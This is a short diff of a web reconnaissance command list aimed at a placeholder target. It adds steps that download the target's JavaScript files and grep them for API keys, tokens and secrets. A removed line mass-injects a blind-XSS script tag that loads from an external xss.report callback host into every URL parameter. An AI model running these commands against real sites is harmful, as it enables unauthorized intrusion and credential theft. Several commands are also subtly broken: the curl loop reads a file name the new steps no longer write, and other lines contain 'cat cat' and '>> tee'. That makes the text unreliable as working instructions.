@@ -19,7 +19,8 @@ $ cat hosts_alive.txt | katana -d 5 | tee katana.txt
 $ cat gauplus.txt gaurls.txt katana.txt | anew all{{TARGET}}urls.txt
 $ cat all{{TARGET}}urls.txt | gf base64 >> tee base64.txt
 $ cat all{{TARGET}}urls.txt | grep -E "redirect=|url=|next=|return=" | tee open_redirect_params.txt
-$ cat all{{TARGET}}urls.txt | grep -oE '(/|https?://)[^"]+\.js' | anew jsfiles.txt
+$ grep -oE '(/|https?://)[^"]+\.js' all{{TARGET}}urls.txt | grep -Ev '/?(jquery|bootstrap|react|vue|angular|popper|moment|chart|axios|lodash)(\.bundle)?(\.min)?\.js' | anew jsfiles_filtered.txt
+$ grep -iE '(auth|login|session|user|account|register|payment|checkout|wallet|admin|dashboard|cms|config|env|debug|core|main|app)' jsfiles_filtered.txt > jsfiles_goldmine.txt
+$ while read url; do curl -s "$url"; done < jsfiles.txt | tee all_javascript_dump.txt | grep -iE 'apikey|token|secret|authorization|bearer'
 $ nuclei -l hosts_alive.txt -t ~/nuclei-templates/ -severity critical,high,medium,low | tee nuclei.txt
-$ cat cat all{{TARGET}}urls.txt | gf xss | qsreplace "'\"><script src=https://xss.report/c/aceos></script>" | httpx
 $ nuclei -t ~/nuclei-templates/cves/ -list hosts_alive.txt | tee cves.txt
